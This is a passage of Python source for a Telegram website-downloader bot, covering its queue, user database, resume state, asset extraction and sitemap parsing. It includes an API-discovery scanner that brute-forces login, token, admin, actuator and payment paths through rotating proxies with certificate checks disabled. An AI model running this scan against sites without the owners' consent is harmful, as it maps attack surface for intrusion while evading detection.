    short_tb = tb[-1500:] if len(tb) > 1500 else tb   # Telegram 4096 char limit

    # User info (if available)
    user_info = ""
    if update and hasattr(update, "effective_user") and update.effective_user:
        u = update.effective_user
        user_info = f"\n👤 User: `{u.id}` ({u.first_name})"

    msg = (
        "🚨 *Bot Error Alert*\n"
        f"━━━━━━━━━━━━━━━━━━━━{user_info}\n\n"
        f"```\n{short_tb}\n```"
    )

    for admin_id in ADMIN_IDS:
        try:
            await context.bot.send_message(
                chat_id=admin_id,
                text=msg,
                parse_mode='Markdown'
            )
        except Exception:
            logger.warning("Admin error notify failed for %d", admin_id)

    logger.error("Unhandled exception: %s", context.error, exc_info=context.error)


# ══════════════════════════════════════════════════
# 🗑️  AUTO-DELETE — Expired download files cleaner
# ══════════════════════════════════════════════════

async def auto_delete_loop():
    """Background task — ၂၄ နာရီ (FILE_EXPIRY_HOURS) ကြာတဲ့ ZIP files auto-delete"""
    while True:
        try:
            now     = time.time()
            deleted = 0
            freed   = 0.0
            for folder in [DOWNLOAD_DIR, RESUME_DIR, APP_ANALYZE_DIR]:
                for root, dirs, files in os.walk(folder):
                    for fname in files:
                        fpath = os.path.join(root, fname)
                        try:
                            age_hours = (now - os.path.getmtime(fpath)) / 3600
                            if age_hours >= FILE_EXPIRY_HOURS:
                                size = os.path.getsize(fpath) / 1024 / 1024
                                os.remove(fpath)
                                deleted += 1
                                freed   += size
                        except Exception:
                            pass
            if deleted:
                logger.info(
                    "Auto-delete: %d files | %.1f MB freed (>%dh old)",
                    deleted, freed, FILE_EXPIRY_HOURS
                )
        except Exception as e:
            logger.warning("Auto-delete loop error: %s", e)
        # ၁ နာရီတစ်ကြိမ် check
        await asyncio.sleep(3600)


# ══════════════════════════════════════════════════
# 📋  QUEUE SYSTEM — Download request queue
# ══════════════════════════════════════════════════

async def queue_worker():
    """Background worker — queue ထဲက download request တွေ တစ်ခုစီ run"""
    global _dl_queue
    while True:
        try:
            task = await _dl_queue.get()
            update, context, url, full_site, use_js, resume_mode, uid = task
            # Remove from position tracker
            _queue_pos.pop(uid, None)
            try:
                await _run_download(update, context, url, full_site, use_js, resume_mode)
            except Exception as e:
                logger.error("Queue worker download error: %s", e)
            finally:
                _dl_queue.task_done()
        except Exception as e:
            logger.error("Queue worker error: %s", e)
            await asyncio.sleep(1)


async def enqueue_download(
    update: Update, context: ContextTypes.DEFAULT_TYPE,
    url: str, full_site: bool, use_js: bool, resume_mode: bool = False
):
    """Download request ကို queue ထဲ ထည့်သည်"""
    global _dl_queue
    uid = update.effective_user.id

    if _dl_queue.qsize() >= QUEUE_MAX:
        await update.effective_message.reply_text(
            f"⚠️ Queue ပြည့်နေပါတယ် (`{QUEUE_MAX}` max)\n"
            "ခဏနေပြီးမှ ထပ်ကြိုးစားပါ",
            parse_mode='Markdown'
        )
        return

    await _dl_queue.put((update, context, url, full_site, use_js, resume_mode, uid))
    pos = _dl_queue.qsize()
    _queue_pos[uid] = pos

    if pos > 1:
        await update.effective_message.reply_text(
            f"📋 *Queue ထဲ ထည့်ပြီးပါပြီ*\n"
            f"📍 Position: `{pos}`\n"
            f"⏳ Download ရောက်လာသည့်အခါ အလိုအလျောက် စမည်",
            parse_mode='Markdown'
        )


# ══════════════════════════════════════════════════
# 📦  DATABASE  (with async lock for race condition)
# ══════════════════════════════════════════════════

def _load_db_sync() -> dict:
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        except Exception:
            pass
    return {
        "users": {},
        "settings": {
            "global_daily_limit": DAILY_LIMIT,
            "max_pages": MAX_PAGES,
            "max_assets": MAX_ASSETS,
            "bot_enabled": True
        }
    }

def _save_db_sync(db: dict):
    # Atomic write — temp file → rename
    tmp = DB_FILE + ".tmp"
    with open(tmp, 'w', encoding='utf-8') as f:
        json.dump(db, f, ensure_ascii=False, indent=2)
    os.replace(tmp, DB_FILE)  # atomic on most OS

async def db_read() -> dict:
    """Thread-safe DB read (non-blocking)"""
    loop = asyncio.get_event_loop()
    async with db_lock:
        return await loop.run_in_executor(None, _load_db_sync)

async def db_write(db: dict):
    """Thread-safe DB write (non-blocking)"""
    loop = asyncio.get_event_loop()
    async with db_lock:
        await loop.run_in_executor(None, _save_db_sync, db)

async def db_update(func):
    """
    Thread-safe atomic DB update (non-blocking)
    Usage: await db_update(lambda db: db["users"][uid].update(...))
    """
    loop = asyncio.get_event_loop()
    async with db_lock:
        db = await loop.run_in_executor(None, _load_db_sync)
        func(db)
        await loop.run_in_executor(None, _save_db_sync, db)
        return db

def get_user(db: dict, user_id: int, name: str = "") -> dict:
    uid = str(user_id)
    if uid not in db["users"]:
        db["users"][uid] = {
            "name": name, "banned": False,
            "daily_limit": None, "count_today": 0,
            "last_date": "", "total_downloads": 0,
            "downloads": []
        }
    if name:
        db["users"][uid]["name"] = name
    return db["users"][uid]

def reset_daily(user: dict):
    today = str(date.today())
    if user["last_date"] != today:
        user["count_today"] = 0
        user["last_date"] = today

def get_limit(db: dict, user: dict) -> int:
    return user["daily_limit"] if user["daily_limit"] is not None \
           else db["settings"]["global_daily_limit"]

def can_download(db: dict, user: dict) -> bool:
    reset_daily(user)
    lim = get_limit(db, user)
    return lim == 0 or user["count_today"] < lim

def log_download(user: dict, url: str, size_mb: float, status: str):
    user["downloads"].append({
        "url": sanitize_log_url(url),       # ← sanitized before storing
        "time": datetime.now().strftime("%Y-%m-%d %H:%M"),
        "size_mb": round(size_mb, 2),
        "status": status
    })
    if len(user["downloads"]) > 100:
        user["downloads"] = user["downloads"][-100:]
    user["count_today"] += 1
    user["total_downloads"] += 1


# ══════════════════════════════════════════════════
# 💾  RESUME STATE  (with HMAC integrity)
# ══════════════════════════════════════════════════

def _state_sig(state: dict) -> str:
    data = json.dumps({k: v for k, v in state.items() if k != "_sig"}, sort_keys=True)
    return hmac.HMAC(SECRET_KEY.encode(), data.encode(), hashlib.sha256).hexdigest()

def _resume_path(url: str) -> str:
    return os.path.join(RESUME_DIR, hashlib.md5(url.encode()).hexdigest()[:12] + ".json")

def load_resume(url: str) -> dict:
    path = _resume_path(url)
    empty = {"visited": [], "downloaded": [], "assets": [], "stats": {}}
    if not os.path.exists(path):
        return empty
    try:
        with open(path) as f:
            state = json.load(f)
        sig = state.pop("_sig", "")
        if not hmac.compare_digest(_state_sig(state), sig):
            logger.warning("Resume state integrity check FAILED — ignoring")
            os.remove(path)
            return empty
        return state
    except Exception:
        return empty

def save_resume(url: str, state: dict):
    to_save = dict(state)
    to_save["_sig"] = _state_sig(state)
    tmp = _resume_path(url) + ".tmp"
    with open(tmp, 'w') as f:
        json.dump(to_save, f)
    os.replace(tmp, _resume_path(url))

def clear_resume(url: str):
    p = _resume_path(url)
    if os.path.exists(p):
        os.remove(p)


# ══════════════════════════════════════════════════
# 📊  PROGRESS BAR (Upgraded for Telegram)
# ══════════════════════════════════════════════════

def pbar(done: int, total: int, width: int = 18) -> str:
    """Telegram တွင် ပိုမိုသပ်ရပ်ချောမွေ့စွာ ပြသပေးမည့် Progress Bar"""
    if total <= 0:
        return "│" + " " * width + "│   0%"
    
    pct = min(max(done / total, 0.0), 1.0)
    fill_exact = pct * width
    full_blocks = int(fill_exact)
    remainder = fill_exact - full_blocks

    partials = [" ", "▏", "▎", "▍", "▌", "▋", "▊", "▉"]
    
    bar = "█" * full_blocks
    if full_blocks < width:
        bar += partials[int(remainder * len(partials))]
        bar += " " * (width - full_blocks - 1)

    pct_str = f"{int(pct * 100):>3}%"
    return f"│{bar}│ {pct_str}"

# ══════════════════════════════════════════════════
# 🌐  JS RENDERER  (Puppeteer via subprocess)
# ══════════════════════════════════════════════════

def fetch_with_puppeteer(url: str) -> str | None:
    """
    SECURITY: URL ကို sanitize + validate ပြီးမှသာ subprocess pass
    shell=False (default) ဖြစ်တဲ့အတွက် shell injection မဖြစ်နိုင်
    """
    if not PUPPETEER_OK:
        return None

    # ── Subprocess injection fix ──────────────────
    safe, reason = is_safe_url(url)
    if not safe:
        logger.warning(f"Puppeteer blocked unsafe URL: {reason}")
        return None

    # Strict URL chars whitelist (extra layer)
    if not re.match(r'^https?://[a-zA-Z0-9\-._~:/?#\[\]@!$&\'()*+,;=%]+$', url):
        logger.warning("Puppeteer blocked URL with invalid characters")
        return None

    try:
        result = subprocess.run(
            ["node", JS_RENDER, url],  # list → no shell injection possible
            capture_output=True,
            timeout=45,
            text=True,
            shell=False                # explicit: False
        )
        if result.returncode == 0 and result.stdout.strip():
            return result.stdout
        logger.warning(f"Puppeteer stderr: {result.stderr[:100]}")
        return None
    except subprocess.TimeoutExpired:
        log_warn(url, "puppeteer timeout")
        return None
    except Exception as e:
        logger.warning(f"Puppeteer exception: {type(e).__name__}")
        return None

def fetch_page(url: str, use_js: bool = False) -> tuple:
    """Returns: (html | None, js_used: bool)"""
    if use_js:
        html = fetch_with_puppeteer(url)
        if html:
            return html, True
        log_info(f"JS fallback to requests: {sanitize_log_url(url)}")

    try:
        resp = requests.get(url, headers=HEADERS, timeout=TIMEOUT)
        resp.raise_for_status()
        ct = resp.headers.get('Content-Type', '')
        if 'text/html' not in ct:
            return None, False
        return resp.text, False
    except Exception as e:
        log_warn(url, f"fetch error: {type(e).__name__}")
        return None, False


# ══════════════════════════════════════════════════
# 🔍  ASSET EXTRACTORS
# ══════════════════════════════════════════════════

def extract_assets(html: str, page_url: str) -> set:
    soup   = BeautifulSoup(html, 'html.parser')
    assets = set()

    # ── Standard links / scripts ──────────────────
    for tag in soup.find_all('link', href=True):
        assets.add(urljoin(page_url, tag['href']))
    for tag in soup.find_all('script', src=True):
        assets.add(urljoin(page_url, tag['src']))

    # ── Images (all lazy-load attrs) ──────────────
    LAZY_ATTRS = (
        'src','data-src','data-lazy','data-original','data-lazy-src',
        'data-srcset','data-original-src','data-hi-res-src',
        'data-full-src','data-image','data-img','data-bg',
        'data-background','data-poster','data-thumb',
    )
    for tag in soup.find_all('img'):
        for attr in LAZY_ATTRS:
            v = tag.get(attr, '')
            if v and not v.startswith('data:'):
                assets.add(urljoin(page_url, v))
        for part in tag.get('srcset', '').split(','):
            u = part.strip().split(' ')[0]
            if u: assets.add(urljoin(page_url, u))

    # ── Video / Audio / Media ─────────────────────
    for tag in soup.find_all(['video', 'audio', 'source', 'track']):
        for attr in ('src', 'data-src', 'poster'):
            v = tag.get(attr, '')
            if v: assets.add(urljoin(page_url, v))
    # <video> direct src
    for tag in soup.find_all('video', src=True):
        assets.add(urljoin(page_url, tag['src']))
    # iframe embeds (video players)
    for tag in soup.find_all('iframe', src=True):
        s = tag['src']
        if any(x in s for x in ('youtube','vimeo','player','embed','video')):
            assets.add(urljoin(page_url, s))

    # ── Downloadable files ────────────────────────
    FILE_EXTS = (
        '.pdf','.zip','.rar','.7z','.tar','.gz',
        '.doc','.docx','.xls','.xlsx','.ppt','.pptx',
        '.mp3','.mp4','.avi','.mkv','.mov','.webm',
        '.apk','.exe','.dmg','.iso',
    )
    for tag in soup.find_all('a', href=True):
        h = tag['href']
        full = urljoin(page_url, h)
        low  = full.lower().split('?')[0]
        if any(low.endswith(ext) for ext in FILE_EXTS):
            assets.add(full)

    # ── CSS inline / style tag ────────────────────
    for tag in soup.find_all(style=True):
        for u in re.findall(r'url\(["\']?(.+?)["\']?\)', tag['style']):
            if not u.startswith('data:'): assets.add(urljoin(page_url, u))
    for st in soup.find_all('style'):
        css = st.string or ''
        for u in re.findall(r'url\(["\']?(.+?)["\']?\)', css):
            if not u.startswith('data:'): assets.add(urljoin(page_url, u))
        for u in re.findall(r'@import\s+["\'](.+?)["\']', css):
            assets.add(urljoin(page_url, u))

    # ── Meta tags (OG image etc) ──────────────────
    for tag in soup.find_all('meta'):
        prop = tag.get('property', '') + tag.get('name', '')
        if any(k in prop.lower() for k in ('image','thumbnail','banner','icon')):
            c = tag.get('content', '')
            if c.startswith('http'): assets.add(c)

    # ── Object / Embed ────────────────────────────
    for tag in soup.find_all(['object', 'embed']):
        v = tag.get('data', '') or tag.get('src', '')
        if v: assets.add(urljoin(page_url, v))

    # ── Regex sweep: static files in raw HTML/JS ──
    for m in re.finditer(
        r'["\']((https?://|/)[^"\'<>\s]+\.(js|css|woff2?|ttf|otf|eot'
        r'|png|jpg|jpeg|gif|svg|webp|avif|ico'
        r'|mp4|webm|mp3|ogg|wav'
        r'|pdf|zip|apk)(\?[^"\'<>\s]*)?)["\']',
        html, re.IGNORECASE
    ):
        u = m.group(1)
        if u.startswith('/'):
            u = urljoin(page_url, u)
        assets.add(u)

    # ── JSON-LD / structured data images ─────────
    for tag in soup.find_all('script', type='application/ld+json'):
        txt = tag.string or ''
        for m in re.finditer(r'"(https?://[^"]+\.(jpg|jpeg|png|webp|gif|svg))"', txt):
            assets.add(m.group(1))

    return assets


def extract_css_assets(css: str, css_url: str) -> set:
    assets = set()
    for u in re.findall(r'url\(["\']?(.+?)["\']?\)', css):
        u = u.strip().strip('"\'')
        if u and not u.startswith('data:') and not u.startswith('#'):
            assets.add(urljoin(css_url, u))
    for u in re.findall(r'@import\s+["\'](.+?)["\']', css):
        assets.add(urljoin(css_url, u))
    return assets


def extract_media_from_js(js_content: str, base_url: str) -> set:
    """
    Mine JS/JSON files for media URLs.
    Useful for React/Vue apps that store image paths in JS bundles.
    """
    assets = set()
    # Full URLs
    for m in re.finditer(
        r'["\`](https?://[^"\'`<>\s]{8,}\.(?:jpg|jpeg|png|gif|webp|avif|svg|mp4|webm|mp3|pdf))["\`]',
        js_content, re.IGNORECASE
    ):
        assets.add(m.group(1))
    # Relative paths
    for m in re.finditer(
        r'["\`](/[^"\'`<>\s]{3,}\.(?:jpg|jpeg|png|gif|webp|avif|svg|mp4|webm|mp3|pdf))["\`]',
        js_content, re.IGNORECASE
    ):
        assets.add(urljoin(base_url, m.group(1)))
    return assets


# ══════════════════════════════════════════════════
# 🗺️  SITEMAP PARSER
# ══════════════════════════════════════════════════

def fetch_sitemap(base_url: str) -> set:
    """
    Fetch sitemap.xml (and sitemap index) — returns all page URLs.
    Supports: /sitemap.xml, /sitemap_index.xml, /robots.txt discovery
    """
    urls   = set()

    def _fetch_one_sitemap(url: str, depth: int = 0):
        if depth > 3:   # FIX: recursion depth limit
            return
        try:
            r = requests.get(url, headers=_get_headers(), timeout=15, verify=False, proxies=proxy_manager.get_proxy())
            if r.status_code != 200:
                return
            text = r.text
            # Sitemap index → recurse
            if '<sitemapindex' in text:
                for m in re.finditer(r'<loc>\s*(https?://[^<]+)\s*</loc>', text):
                    sub = m.group(1).strip()
                    if sub not in urls:
                        _fetch_one_sitemap(sub, depth + 1)
            else:
                for m in re.finditer(r'<loc>\s*(https?://[^<]+)\s*</loc>', text):
                    urls.add(m.group(1).strip())
        except Exception:
            pass

    # Try common sitemap locations
    parsed = urlparse(base_url)
    root   = f"{parsed.scheme}://{parsed.netloc}"

    # Check robots.txt for sitemap pointer first
    try:
        r = requests.get(f"{root}/robots.txt", headers=HEADERS,
                         timeout=8, verify=False,
                         proxies=proxy_manager.get_proxy())
        if r.status_code == 200:
            for m in re.finditer(r'(?i)sitemap:\s*(https?://\S+)', r.text):
                _fetch_one_sitemap(m.group(1).strip())
    except Exception:
        pass

    if not urls:
        for path in ['/sitemap.xml', '/sitemap_index.xml',
                     '/sitemap/sitemap.xml', '/wp-sitemap.xml',
                     '/news-sitemap.xml', '/post-sitemap.xml',
                     '/page-sitemap.xml', '/product-sitemap.xml']:
            _fetch_one_sitemap(root + path)

    # Filter to same domain only
    netloc = parsed.netloc
    return {u for u in urls if urlparse(u).netloc == netloc}


# ══════════════════════════════════════════════════
# 🔌  API ENDPOINT DISCOVERY
# ══════════════════════════════════════════════════

# Common API paths for e-commerce + news/blog sites
_API_PATHS_ECOMMERCE = [
    # General Ecommerce
    '/api/products', '/api/v1/products', '/api/v2/products',
    '/api/categories', '/api/v1/categories',
    '/api/items', '/api/inventory',
    '/api/cart', '/api/orders', '/api/v1/orders',
    '/api/checkout', '/api/payments', '/api/shipping', # Added checkout & payments
    '/api/search', '/api/v1/search',
    '/api/users', '/api/v1/users', '/api/customers',   # Added customers
    '/api/config', '/api/settings',
    
    # WooCommerce REST API
    '/wp-json/wc/v3/products', '/wp-json/wc/v3/categories',
    '/wp-json/wc/v3/orders', '/wp-json/wc/v3/customers',
    '/wp-json/wc/v2/products', '/wp-json/wc/v2/orders',
    
    # Magento
    '/rest/V1/products', '/rest/V1/categories', '/rest/V1/orders',
    '/rest/default/V1/products',
    
    # GraphQL
    '/graphql', '/api/graphql', '/v1/graphql', '/graphql/schema.json',
    
    # Shopify
    '/products.json', '/collections.json', '/pages.json',
    '/collections/all/products.json', '/admin/api/2023-10/products.json',
    
    # General Base
    '/api', '/api/v1', '/api/v2', '/api/v3',
    '/rest/v1', '/rest/api',
]

_API_PATHS_NEWS = [
    # WordPress REST API
    '/wp-json/wp/v2/posts', '/wp-json/wp/v2/pages',
    '/wp-json/wp/v2/categories', '/wp-json/wp/v2/tags',
    '/wp-json/wp/v2/media', '/wp-json/wp/v2/users', '/wp-json',
    
    # General news APIs
    '/api/articles', '/api/posts', '/api/news', '/api/blogs',
    '/api/v1/articles', '/api/v1/posts', '/api/v2/posts',
    
    # Feeds & Sitemaps
    '/api/feed', '/feed.json', '/feed/json',
    '/rss', '/rss.xml', '/feed', '/feed.rss',
    '/atom.xml', '/sitemap.xml', '/sitemap_index.xml', '/sitemap-news.xml',
    
    # Ghost CMS
    '/ghost/api/v4/content/posts/', '/ghost/api/v3/content/posts/',
    
    # Strapi
    '/api/articles?populate=*', '/api/posts?populate=*',
    
    # Drupal JSON:API
    '/jsonapi/node/article', '/jsonapi/node/page',
]

_API_PATHS_GENERAL = [
    # Health & Info
    '/api/health', '/api/status', '/health', '/ping', '/healthcheck',
    '/version', '/api/version', '/info', '/api/info',
    
    # Documentation & Swagger
    '/.well-known/openapi.json', '/openapi.json', '/openapi.yaml',
    '/swagger.json', '/swagger.yaml', '/api-docs', '/swagger-ui.html',
    '/docs', '/api/docs', '/redoc', '/api/redoc',
    
    # Well-known & Discovery
    '/.well-known/security.txt', '/.well-known/core-config',
]

# ----------------- အသစ်ထပ်တိုးထားသောအပိုင်းများ ----------------- #

_API_PATHS_AUTH = [
    # Login & Authentication
    '/api/login', '/api/v1/login', '/api/auth', '/api/v1/auth',
    '/api/auth/login', '/api/users/login', '/api/admin/login',
    '/api/register', '/api/v1/register', '/api/auth/register', '/api/signup',
    
    # Tokens (JWT, OAuth)
    '/api/token', '/api/v1/token', '/oauth/token', '/oauth2/token',
    '/api/refresh', '/api/token/refresh', '/api/auth/refresh',
    
    # Current User Profile & Logout
    '/api/me', '/api/v1/me', '/api/user', '/api/current_user',
    '/api/logout', '/api/auth/logout',
    
    # WordPress Specific Auth Plugins (JWT Authentication)
    '/wp-json/jwt-auth/v1/token', '/wp-json/aam/v2/authenticate',
]

_API_PATHS_ADMIN = [
    # Admin Panels & Dashboards
    '/api/admin', '/api/v1/admin', '/admin/api',
    '/api/dashboard', '/api/system', '/api/config', '/api/settings',
    '/api/admin/users', '/api/admin/settings',
    '/admin/dashboard.json', '/api/stats', '/api/metrics',
    
    # Spring Boot Actuator (Java)
    '/actuator/health', '/actuator/info', '/manage/health', '/manage/info'
]

# ── API paths တိုးချဲ့ ────────────────────────────
_API_PATHS_MOBILE = [
    # Mobile / App APIs
    '/api/v1/app', '/api/v2/app', '/api/mobile',
    '/api/v1/config', '/api/v2/config',
    '/api/notifications', '/api/v1/notifications',
    '/api/v1/feed', '/api/v2/feed',
    '/api/social', '/api/friends', '/api/followers',
    '/api/messages', '/api/v1/messages',
    '/api/upload', '/api/media', '/api/files',
    '/api/analytics', '/api/events', '/api/tracking',
]

_API_PATHS_FINANCE = [
    # Fintech / Payment / Crypto
    '/api/payments', '/api/v1/payments', '/api/transactions',
    '/api/wallet', '/api/balance', '/api/withdraw', '/api/deposit',
    '/api/exchange', '/api/rates', '/api/currency',
    '/api/invoice', '/api/billing', '/api/subscriptions',
    '/api/v1/subscriptions', '/api/plans',
    '/api/crypto', '/api/coins', '/api/market',
    '/api/accounts', '/api/v1/accounts', '/api/v2/accounts',
]

_API_PATHS_SAAS = [
    # SaaS / Dashboard
    '/api/workspaces', '/api/projects', '/api/teams',
    '/api/members', '/api/invitations', '/api/roles',
    '/api/reports', '/api/exports', '/api/imports',
    '/api/webhooks', '/api/integrations', '/api/plugins',
    '/api/audit', '/api/logs', '/api/activity',
    # Laravel / Sanctum / Passport
    '/api/csrf-cookie', '/api/user', '/sanctum/csrf-cookie',
    '/oauth/authorize', '/oauth/clients', '/oauth/personal-access-tokens',
    # Django REST Framework
    '/api/schema/', '/api/schema/swagger-ui/', '/api/schema/redoc/',
    # FastAPI / Starlette
    '/docs', '/redoc', '/openapi.json',
    # Next.js API routes
    '/api/_next', '/api/auth/[...nextauth]', '/api/auth/session',
    '/api/auth/csrf', '/api/auth/providers',
    # Supabase / Firebase-style
    '/rest/v1/', '/auth/v1/', '/storage/v1/',
]

ALL_API_PATHS = list(dict.fromkeys(
    _API_PATHS_ECOMMERCE +
    _API_PATHS_NEWS      +
    _API_PATHS_GENERAL   +
    _API_PATHS_AUTH      +   # ← Fix: ပါမနေတာ ထည့်
    _API_PATHS_ADMIN     +   # ← Fix: ပါမနေတာ ထည့်
    _API_PATHS_MOBILE    +
    _API_PATHS_FINANCE   +
    _API_PATHS_SAAS
))


# ── API URL patterns in JS bundles ─────────────
_JS_API_PATTERNS = [
    re.compile(r"""(?:fetch|axios\.(?:get|post|put|delete|patch))\s*\(\s*['"`]([^'"`\s]{5,200})['"`]"""),
    re.compile(r"""(?:url|endpoint|baseURL|apiUrl|API_URL)\s*[:=]\s*['"`]([^'"`\s]{5,200})['"`]"""),
    re.compile(r"""['"`](/api/[^\s'"`\?#]{3,100})['"`]"""),
    re.compile(r"""['"`](/rest/[^\s'"`\?#]{3,100})['"`]"""),
    re.compile(r"""['"`](/v\d+/[^\s'"`\?#]{3,100})['"`]"""),
    re.compile(r"['\"`](https?://[^\s'\"` ]{10,200}/api/[^\s'\"` ?#]{2,100})['\"`]"),
]

def _extract_api_urls_from_js(js_text: str, base_root: str) -> list:
    """JS bundle/source ထဲက API URL တွေ mine လုပ်"""
    found = set()
    for pat in _JS_API_PATTERNS:
        for m in pat.findall(js_text):
            url = m.strip()
            if not url or len(url) < 4:
                continue
            if url.startswith('/'):
                url = base_root + url
            if url.startswith('http') and '/api/' not in url and '/rest/' not in url and '/v' not in url:
                continue
            if url.startswith('http') or url.startswith('/'):
                found.add(url)
    return list(found)


def _extract_api_urls_from_html(html: str, base_root: str) -> list:
    """HTML source ထဲက API references mine လုပ်"""
    found = set()
    soup  = BeautifulSoup(html, 'html.parser')

    # data-* attributes
    for tag in soup.find_all(True):
        for attr, val in tag.attrs.items():
            if isinstance(val, str) and ('/api/' in val or '/rest/' in val):
                if val.startswith('/') or val.startswith('http'):
                    url = (base_root + val) if val.startswith('/') else val
                    found.add(url.split('?')[0])

    # Inline scripts
    for script in soup.find_all('script'):
        if script.string:
            for url in _extract_api_urls_from_js(script.string, base_root):
                found.add(url.split('?')[0])

    # <link rel="..."> and <a href="..."> with /api/
    for tag in soup.find_all(['link', 'a'], href=True):
        href = tag['href']
        if '/api/' in href or '/graphql' in href:
            url = (base_root + href) if href.startswith('/') else href
            found.add(url.split('?')[0])

    return list(found)


def _mine_js_bundles(html: str, root: str, proxies) -> list:
    """External JS files တွေ download ပြီး API URLs ထုတ်"""
    soup = BeautifulSoup(html, 'html.parser')
    js_urls = []
    for tag in soup.find_all('script', src=True):
        src = tag['src']
        if not src: continue
        if src.startswith('//'):
            src = 'https:' + src
        elif src.startswith('/'):
            src = root + src
        if src.startswith('http') and ('chunk' in src or 'bundle' in src or
                'main' in src or 'app' in src or 'vendor' in src or 'index' in src):
            js_urls.append(src)

    found = set()
    for js_url in js_urls[:8]:   # max 8 JS bundles
        try:
            r = requests.get(js_url, headers=HEADERS, timeout=10, verify=False, proxies=proxy_manager.get_proxy())
            if r.status_code == 200 and len(r.text) > 100:
                for url in _extract_api_urls_from_js(r.text, root):
                    found.add(url.split('?')[0])
        except Exception:
            pass
    return list(found)


def _check_robots_and_sitemap(root: str, proxies) -> list:
    """robots.txt / sitemap.xml ထဲက API paths ရှာ"""
    found = set()
    # robots.txt — Disallow paths with /api/
    try:
        r = requests.get(root + '/robots.txt', headers=HEADERS,
                         timeout=8, verify=False,
                         proxies=proxy_manager.get_proxy())
        if r.status_code == 200:
            for line in r.text.splitlines():
                line = line.strip()
                if line.lower().startswith(('disallow:', 'allow:')):
                    path = line.split(':', 1)[1].strip()
                    if any(kw in path for kw in ['/api/', '/rest/', '/v1/', '/v2/', '/graphql']):
                        found.add(root + path.split('*')[0].rstrip('$'))
    except Exception:
        pass
    return list(found)


def discover_api_endpoints(base_url: str, progress_cb=None) -> dict:
    """
    Comprehensive API discovery:
    1. Predefined path brute-force (ALL_API_PATHS)
    2. HTML source mining (data-* attrs, inline scripts)
    3. JS bundle mining (fetch/axios/url patterns)
    4. robots.txt / sitemap discovery
    5. CORS header detection
    Returns: {"found": [...], "js_mined": [...], "html_mined": [...],
              "robots": [...], "stats": {...}}
    """
    parsed  = urlparse(base_url)
    root    = f"{parsed.scheme}://{parsed.netloc}"

    # ── Phase 0: Fetch homepage for mining ───────
    homepage_html = None
    try:
        r0 = requests.get(base_url, headers=HEADERS, timeout=12, verify=False,
                         proxies=proxy_manager.get_proxy())
        if r0.status_code == 200:
            homepage_html = r0.text
    except Exception:
        pass

    # ── Phase 1: HTML + JS mining (parallel) ─────
    html_mined = []
    js_mined   = []
    robots_found = []

    if homepage_html:
        if progress_cb: progress_cb("🔍 HTML source mining...")
        html_mined = _extract_api_urls_from_html(homepage_html, root)

        if progress_cb: progress_cb("📦 JS bundle mining...")
        js_mined   = _mine_js_bundles(homepage_html, root, None)

    if progress_cb: progress_cb("🤖 robots.txt scanning...")
    robots_found = _check_robots_and_sitemap(root, None)

    # ── Phase 2: Path brute-force ─────────────────
    found  = []
    seen   = set()

    def _probe(path: str) -> dict | None:
        url = root + path if path.startswith('/') else path
        try:
            r = requests.get(
                url,
                headers={**HEADERS, 'Accept': 'application/json, text/plain, */*'},
                timeout=7, verify=False,
                allow_redirects=True,
                proxies=proxy_manager.get_proxy()
            )
            ct  = r.headers.get('Content-Type', '')
            cors = r.headers.get('Access-Control-Allow-Origin', '')
            size = len(r.content)

            endpoint = {
                "url":    url,
                "status": r.status_code,
                "cors":   cors if cors else None,
                "size_b": size,
                "preview": "",
                "type":   "OTHER",
                "method": "GET",
            }

            if r.status_code in (401, 403):
                endpoint["type"] = "PROTECTED"
                return endpoint

            if r.status_code in (405,):   # Method Not Allowed → endpoint exists
                endpoint["type"] = "PROTECTED"
                endpoint["note"] = "POST only"
                return endpoint

            if r.status_code == 200 and size > 5:
                body = r.text[:400].strip()
                if 'json' in ct or body.startswith(('{', '[')):
                    endpoint["type"]    = "JSON_API"
                    endpoint["preview"] = body[:150]
                    # Try to detect if it's GraphQL
                    if '/graphql' in url or ('"data"' in body and '"errors"' in body):
                        endpoint["type"] = "GRAPHQL"
                elif 'xml' in ct or 'rss' in ct or 'atom' in ct:
                    endpoint["type"]    = "XML/RSS"
                    endpoint["preview"] = body[:100]
                elif 'html' in ct and ('/swagger' in url or '/redoc' in url or '/docs' in url):
                    endpoint["type"]    = "API_DOCS"
                    endpoint["preview"] = "Swagger/OpenAPI docs"
                elif size > 20:
                    endpoint["type"]    = "OTHER"
                    endpoint["preview"] = body[:80]
                else:
                    return None
                return endpoint
        except Exception:
            pass
        return None

    # ── Probe ALL paths (brute-force) ─────────────
    # Also probe mined URLs
    all_probe_paths = list(ALL_API_PATHS)
    # Add mined paths (path-only)
    for mined_url in (html_mined + js_mined + robots_found):
        try:
            p = urlparse(mined_url).path
            if p and p not in all_probe_paths and len(p) < 150:
                all_probe_paths.append(p)
        except Exception:
            pass

    total = len(all_probe_paths)
    if progress_cb:
        progress_cb(f"🔌 Path scanning: `{total}` paths...")

    with concurrent.futures.ThreadPoolExecutor(max_workers=15) as ex:
        fmap = {ex.submit(_probe, path): path for path in all_probe_paths}
        done = 0
        for fut in concurrent.futures.as_completed(fmap, timeout=90):
            done += 1
            try:
                result = fut.result(timeout=10)
                if result and result["url"] not in seen:
                    seen.add(result["url"])
                    found.append(result)
            except Exception:
                pass
            if progress_cb and done % 15 == 0:
                progress_cb(
                    f"🔌 Scanning: `{done}/{total}`\n"
                    f"✅ JSON: `{sum(1 for e in found if e['type']=='JSON_API')}` | "
                    f"🔒 Protected: `{sum(1 for e in found if e['type']=='PROTECTED')}` | "
                    f"📰 RSS: `{sum(1 for e in found if e['type']=='XML/RSS')}`"
                )

    _type_order = {"JSON_API": 0, "GRAPHQL": 1, "XML/RSS": 2,
                   "API_DOCS": 3, "PROTECTED": 4, "OTHER": 5}
    found.sort(key=lambda x: _type_order.get(x["type"], 9))

    return {
        "found":       found,
        "js_mined":    list(set(js_mined)),
        "html_mined":  list(set(html_mined)),
        "robots":      robots_found,
        "stats": {
            "total_probed":   total,
            "json_apis":      sum(1 for e in found if e["type"] == "JSON_API"),
            "graphql":        sum(1 for e in found if e["type"] == "GRAPHQL"),
            "xml_rss":        sum(1 for e in found if e["type"] == "XML/RSS"),
            "api_docs":       sum(1 for e in found if e["type"] == "API_DOCS"),
            "protected":      sum(1 for e in found if e["type"] == "PROTECTED"),
            "other":          sum(1 for e in found if e["type"] == "OTHER"),
            "js_urls_found":  len(js_mined),
            "html_urls_found":len(html_mined),
        }
    }



def get_internal_links(html: str, base_url: str) -> set:
    soup    = BeautifulSoup(html, 'html.parser')
    netloc  = urlparse(base_url).netloc
    links   = set()
    for a in soup.find_all('a', href=True):
